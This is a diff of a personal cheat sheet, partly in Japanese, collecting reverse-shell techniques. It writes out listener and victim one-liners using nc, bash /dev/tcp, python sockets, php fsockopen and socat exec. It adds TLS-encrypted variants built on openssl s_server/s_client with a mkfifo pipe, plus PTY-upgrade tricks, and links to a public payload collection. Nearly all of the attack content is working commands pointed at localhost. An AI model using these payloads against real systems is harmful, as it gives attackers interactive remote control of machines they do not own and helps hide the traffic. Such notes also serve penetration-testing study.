@@ -23,14 +23,27 @@ sudo apt-get install -y socat
 <!-- ### attacker machine -->
 <!-- ### victim machine -->
 
+## TL;DR
+* attacker machine
+  * 基本的に自由な環境
+    * `openssl`と`socat`がほしい
+* victim machine
+  * `openssl`さえあればsecureな通信が可能
+  * `socat`があるに越したことはないが，`python -c 'import pty; pty.spawn("/bin/sh")'`での代用や直接バイナリをダウンロードする方法がある
+    * [static\-binaries/socat at master · andrew\-d/static\-binaries]( https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat )
+
+### DONE
+* 通信のみはsecureで制御信号も受け付ける
+
+### TODO
+* attackerがclient証明書を利用するケース
+* victimがserver証明書を利用するケース(only victim reshepy ok)
+* ファイルを共有せずにone linerで上記の項目を実現し，完全にsecureとしたい
+
 ## ubuntu
 ### attacker machine
 ```
 nc -nvlp 8080
-```
-
-```
-socat tcp-listen:8080,reuseaddr,fork stdout
 ```
 
 ### victim machine
@@ -42,6 +55,12 @@ bash -i >& /dev/tcp/localhost/8080 0>&1
 ### attacker machine
 ```
 nc -nvl 8080
+```
+
+```
+# socat tcp-listen:8080,reuseaddr,fork stdout
+# below command can handle signal and tab
+socat $(tty),raw,echo=0 tcp-listen:8080,reuseaddr
 ```
 
 ### victim machine
@@ -59,6 +78,10 @@ python -c 'import sys,socket,subprocess,os;s=socket.socket(socket.AF_INET,socket
 php -r '$sock=fsockopen($argv[1],intval($argv[2]));exec("/bin/bash -i <&3 >&3 2>&3");' 127.0.0.1 8080
 ```
 
+```
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:localhost:8080
+```
+
 ## FYI
 * [PayloadsAllTheThings/Reverse Shell Cheatsheet\.md at master · swisskyrepo/PayloadsAllTheThings]( https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md?source=post_page-----c7598145282d---------------------- )
 * `source`: [ersh\.py: a pure Python encrypted reverse shell \| Borderline]( https://blog.kwiatkowski.fr/?q=en/ersh )
@@ -71,19 +94,22 @@ php -r '$sock=fsockopen($argv[1],intval($argv[2]));exec("/bin/bash -i <&3 >&3 2>
 
 ### attacker machine
 ```
-openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 3650 -nodes
+# openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 3650 -nodes
 # Country Name (2 letter code) []: US
 # Common Name (eg, fully qualified host name) []:www.localhost.com
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 3650 -nodes -subj "/C=US/ST=/L=/O=/OU=/CN=www.localhost.com/emailAddress=/"
+
 openssl s_server -quiet -key key.pem -cert cert.pem -port 8080
 ```
+
 
 ```
 reshepy localhost:8080
 ```
 
-
-`socat` version
+`socat` secure version
 ```
+# verify=0: no client certificate check
 socat $(tty),raw,echo=0 openssl-listen:8080,reuseaddr,cert=cert.pem,key=key.pem,verify=0
 ```
 
@@ -95,8 +121,22 @@ at darwin
 
 ### victim machine
 ```
-mkfifo /tmp/p;bash -i < /tmp/p 2>&1 | openssl s_client -quiet -connect 127.0.0.1:8080 > /tmp/p;rm -f /tmp/p
+# socat ok
+mkfifo /tmp/p;python -c 'import pty; pty.spawn("/bin/sh")' < /tmp/p 2>&1 | openssl s_client -quiet -connect 127.0.0.1:8080 > /tmp/p;rm -f /tmp/p
 ```
+pythonのspawn a TTY shell from an interpreterを利用することでsocat(fully tty reverse shell)なしでもOK
+
+`socat` secure version
+```
+socat openssl-connect:localhost:8080,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane
+```
+より安全に通信したい場合には`verify=1`とする?
+
+```
+reshepy -c cert.pem --host=www.localhost.com localhost:8080
+```
+client側が適切なサーバかどうかを判定する処理
+(ctrl-cやtab ok)
 
 ----
 
